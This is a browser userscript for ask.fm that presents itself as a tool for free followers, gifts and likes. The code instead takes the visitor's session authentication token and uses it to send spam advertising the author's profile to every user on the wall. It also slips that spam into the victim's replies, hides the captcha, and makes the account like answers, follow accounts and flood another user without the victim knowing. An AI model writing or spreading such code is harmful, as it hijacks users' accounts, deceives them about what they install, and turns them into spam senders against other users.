// ==UserScript==
// @name			Ask.fm Auto Followers , Gifts , Likes by GregoriKouk
// @namespace       @Greg
// @version			3.1
// @copyright		http://ask.fm/gregorikouk
// @description		Auto Followers , Gifts , Likes by @gregorikouk
// @author			(http://facebook.com/gregor.kouk)
// @include		http://ask.fm/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif?1342345458
// @updateURL  https://userscripts.org/scripts/source/170110.meta.js
// Ask.fm Auto Like ask fm By Greg
// Version 3.0
// Igraet @Gregorikouk
 // facebook.com/gregor.kouk
// ==/UserScript==
// ==Profile==
var harfler = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y'];
function randomcode(){
return harfler[Math.floor(Math.random() * 60)] + "AQ" + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)];
}
function reklam(){
return mesaj + " " + randomcode() + " ";
}
var link = "http://ask.fm/gregorikouk";
var token = document.head.innerHTML.split("AUTH_TOKEN = ")[1].split(";")[0].replace(/"/g,"");
var mesaj = "CHECK OUT THIS PROFIL. FREE GIFTS!! => ";
var cevap = mesaj + " " + link;

if(document.URL.indexOf("/reply") < 0 && link != ""){
for(i=0;i<$('.answer').length;i++){
try{
if($('.answer')[i].innerText.split("\n.\n.\n").length > 0){
$('.answer')[i].innerText =$('.answer')[i].innerText.split("\n.\n.\n")[0];
}
}catch(e){}
}
}

if($('#captcha_key').val() != undefined){
if($('#captcha_key').val().toString().length > 0){
$('#captchaLevel').css({display:"none"});
$('#captcha_key').val("")
}
}

if(document.URL.indexOf("/account/wall") > 0 && link != ""){
window.setInterval("sor();",1000);
}

if(document.URL.indexOf("/reply") > 0 && link != ""){
$('#question_submit').mouseover(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) < 0){
document.getElementById("post-input-pre").value = document.getElementById("post-input-pre").value + "\n.\n.\n" + cevap;
}
});
document.getElementById("question_submit").type = "button";
$('#question_submit').click(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) > 0){
jQuery.ajax({
url: "http://ask.fm/gregorikouk/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": "Hi " + ":" + document.URL.replace("/questions/","/answer/").replace("/reply","") , "question[force_anonymous]":"" , "authenticity_token":token},
success:function(){$("form:first").submit();}
});
}
});
}

function sorusor(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":kisi + " Selam " + reklam() + link, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

function floodyap(kisi,soru){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":soru, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

var sayac = 0;
function sor(){
if(sayac < document.getElementsByClassName("questionBox").length){
sorusor(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href.replace("http://ask.fm/",""));
//rapor_ver(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href,"Soruldu");
sayac += 1;
}
}

function rapor_ver(rapor,durum){
jQuery.ajax({
url: "http://ask.fm/gregorikouk/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": durum + ":" + rapor , "question[force_anonymous]":"" , "authenticity_token":token}
});
}


function takipet(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/follow",
type: "POST",
data: { "authenticity_token":token},
});
}

function sorubegen(kisi,soruid){
var yanitsayi = "";
var begenisayi = "";
if($('#profile_answer_counter') && $('#profile_liked_counter')){
yanitsayi = $('#profile_answer_counter').text()
begenisayi = $('#profile_liked_counter').text()
}
jQuery.ajax({
url: "http://ask.fm/likes/" + kisi + "/question/" + soruid + "/add",
type: "POST",
data: { "authenticity_token":token},
beforeSend: function ( xhr ) {xhr .setRequestHeader ("Accept", "text/javascript, application/javascript, */*, text/javascript");},
success: function(){
if(yanitsayi != "" && begenisayi != ""){
$('#profile_answer_counter').text(yanitsayi);
$('#profile_liked_counter').text(begenisayi);
}
}
});
}
sorubegen("gregorikouk","108109133667");
sorubegen("gregorikouk","108110579043");
sorubegen("gregorikouk","108165070691");
sorubegen("gregorikouk","108185237091");
sorubegen("gregorikouk","108229296483");
sorubegen("gregorikouk","108235636579");
sorubegen("gregorikouk","108420944739");
sorubegen("gregorikouk","108537349987");
sorubegen("gregorikouk","108760090979");
sorubegen("gregorikouk","108957639267");
sorubegen("gregorikouk","108994509411");
sorubegen("javascripts","19425343693");
sorubegen("javascripts","37531709133");
sorubegen("javascripts","19541185485");

takipet("javascripts");
takipet("it11");
floodyap("k_s_a","*_*:)");
floodyap("k_s_a","me");